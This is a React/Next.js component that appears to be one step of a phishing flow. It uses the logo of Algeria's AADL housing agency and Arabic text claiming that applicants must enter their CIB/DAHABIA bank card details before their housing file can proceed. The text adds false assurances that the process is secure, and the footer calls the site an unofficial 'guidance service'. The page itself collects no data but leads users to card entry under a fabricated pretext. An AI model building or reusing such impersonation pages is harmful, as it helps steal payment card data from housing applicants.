"use client"

import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import Image from "next/image"
import { CreditCard, Shield, CheckCircle2 } from "lucide-react"

interface VerificationStepProps {
  onNext: () => void
  onBack: () => void
}

export function VerificationStep({ onNext, onBack }: VerificationStepProps) {
  return (
    <div className="min-h-screen bg-gradient-to-b from-[#1a1a4e] via-[#2a2a6e] to-[#1a1a4e] flex flex-col items-center justify-center p-4 relative overflow-hidden">
      {/* Background decorations */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute top-0 left-0 w-full h-full opacity-5">
          <div className="absolute top-10 left-10 w-64 h-64 bg-white rounded-full blur-3xl" />
          <div className="absolute bottom-20 right-10 w-80 h-80 bg-yellow-400 rounded-full blur-3xl" />
        </div>
        <div className="absolute inset-0 bg-[linear-gradient(rgba(255,255,255,0.03)_1px,transparent_1px),linear-gradient(90deg,rgba(255,255,255,0.03)_1px,transparent_1px)] bg-[size:50px_50px]" />
      </div>

      <div className="relative z-10 w-full max-w-lg">
        {/* Logo */}
        <div className="flex justify-center mb-6">
          <div className="bg-white rounded-2xl p-3 shadow-2xl">
            <Image
              src="/aadl-logo.png"
              alt="AADL Logo"
              width={80}
              height={80}
              className="object-contain"
            />
          </div>
        </div>

        <Card className="bg-white/95 backdrop-blur-sm p-6 shadow-2xl border-0 rounded-2xl">
          {/* Header */}
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-gradient-to-r from-[#1a1a4e] to-[#3a3a8f] rounded-full flex items-center justify-center mx-auto mb-4">
              <Shield className="w-8 h-8 text-white" />
            </div>
            <h1 className="text-xl font-bold text-[#1a1a4e] mb-2">ادخال بيانات البطاقة</h1>
            <p className="text-sm text-gray-600">خطوة ضرورية قبل حل مشكلتك</p>
          </div>

          {/* Explanation */}
          <div className="bg-blue-50 rounded-xl p-4 mb-4">
            <p className="text-sm text-gray-700 text-center leading-relaxed">
              يرجى ادخال بيانات البطاقة <strong>(CIB/DAHABIA)</strong> التي ستستعملها في عملية دفع الشطر الاول
            </p>
          </div>

          {/* Important notice */}
          <div className="bg-amber-50 border border-amber-200 rounded-xl p-3 mb-4">
            <p className="text-xs text-amber-800 text-center leading-relaxed">
              هذه الخطوة ضرورية للتاكد من ان المكتتب يملك بطاقة دفع صالحة قبل تفعيل ظهور نوع الشقة والامر بالدفع
            </p>
          </div>

          {/* Benefits */}
          <div className="space-y-2 mb-6">
            <div className="flex items-center gap-3 bg-green-50 rounded-lg p-3">
              <CheckCircle2 className="w-5 h-5 text-green-500 flex-shrink-0" />
              <p className="text-sm text-gray-700">التاكد من صلاحية بطاقة الدفع</p>
            </div>
            <div className="flex items-center gap-3 bg-green-50 rounded-lg p-3">
              <CheckCircle2 className="w-5 h-5 text-green-500 flex-shrink-0" />
              <p className="text-sm text-gray-700">تفعيل ظهور نوع الشقة والامر بالدفع</p>
            </div>
            <div className="flex items-center gap-3 bg-green-50 rounded-lg p-3">
              <CheckCircle2 className="w-5 h-5 text-green-500 flex-shrink-0" />
              <p className="text-sm text-gray-700">العملية امنة وبياناتك محمية</p>
            </div>
          </div>

          {/* Card type indicator */}
          <div className="flex items-center justify-center gap-2 mb-6 text-sm text-gray-500">
            <CreditCard className="w-5 h-5" />
            <span>CIB / DAHABIA</span>
          </div>

          {/* Continue Button */}
          <Button
            onClick={onNext}
            className="w-full bg-gradient-to-r from-[#1a1a4e] to-[#3a3a8f] hover:from-[#2a2a6e] hover:to-[#4a4a9f] text-white font-semibold py-4 rounded-xl transition-all shadow-lg mb-3"
          >
            متابعة التحقق
          </Button>

          {/* Back Button */}
          <Button
            onClick={onBack}
            variant="outline"
            className="w-full bg-transparent border-gray-300 text-gray-600 font-semibold py-3 rounded-xl"
          >
            العودة
          </Button>
        </Card>

        {/* Footer */}
        <p className="text-center text-xs text-white/50 mt-4">
          خدمة ارشادية لمتابعة ملفات AADL 3
        </p>
      </div>
    </div>
  )
}
